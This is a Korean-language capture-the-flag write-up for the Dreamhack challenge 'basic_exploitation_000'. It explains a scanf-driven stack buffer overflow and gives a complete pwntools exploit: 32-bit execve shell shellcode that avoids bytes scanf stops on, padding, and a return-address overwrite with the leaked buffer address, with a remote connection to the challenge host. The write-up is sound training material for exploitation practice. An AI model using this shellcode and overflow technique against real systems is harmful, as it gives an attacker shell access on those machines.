basic_exploitation_000 라이트업
===============


<img width="378" height="653" alt="image" src="https://github.com/user-attachments/assets/ab52834a-c7f8-4330-9427-a4e578d70224" />

main 함수를 보면 char 배열 buf에 0X80 바이트를 할당해준다. 이후 initialize 함수를 실행하는데 함수를 보면

```c
    signal(SIGALRM, alarm_handler);
    alarm(30);
```

    
프로세스가 30초가 지나면 자동으로 alarm_handler 함수를 실행하여 프로세스가 종료된.

```c
    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);
```
    
여기서는 스택에서 buf가 위치한 주소를 출력해주고 buf에 최대 141바이트 문자열을 입력받는다. 
buf에는 0x80 = 128바이트만이 할당되어있다. 따라서 버퍼 오버플로우가 발생함을 확인할 수 있다.

buf를 아무런 값으로 채우고 ret를 덮어서 셸을 실행시키는 기능이 있는 셸코드를 실행하면 된다. 

채워야 하는 부분은 rbp-0x80 부터 rbp +0x04 니까 0x84 = 132바이트이다.    

scanf 우회 셸코드 (26바이트) 는 구글링해서 알아냈다. 나머지 132 - 26 = 106 바이트는 아무값으로만 채우면 된다.

### 익스플로잇 코드

```python
from pwn import *

p = remote("host8.dreamhack.games",11801)
context.arch = "i386"  

p.recvuntil("buf = (")
buf_addr = int(p.recv(10),16) 

payload = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
payload += b"\x11" * 106

payload += p32(buf_addr)

p.sendline(payload)
p.interactive()
```

틀리기 쉬운 부분들을 잘 보면

* `payload += b"\x11" * 106` : \x11이라는 바이트를 패딩 문자로 사용했다. `scanf` 는 널 바이트(\x00)를 만나면 문자열 읽기를 중단하는데 \x11은 널 바이트가 아니므로 scanf가 페이로드 전체를 읽을 수 있게 해준다.
*  payload += p32(buf_addr): 셸코드와 패딩 뒤에 buf의 주소를 붙여 최종적으로 프로그램이 돌아갈 리턴 주소를 덮어쓴다. scanf가 페이로드 전체를 읽기 때문에 이 주소 값이 스택에 정확히 쓰여 익스플로잇을 성공시킨다.


### 실행 결과

<img width="636" height="220" alt="image" src="https://github.com/user-attachments/assets/664316f9-acc5-4c82-b91b-f385f4aa66a5" />

이렇게 플래그를 얻어낼 수 있다.

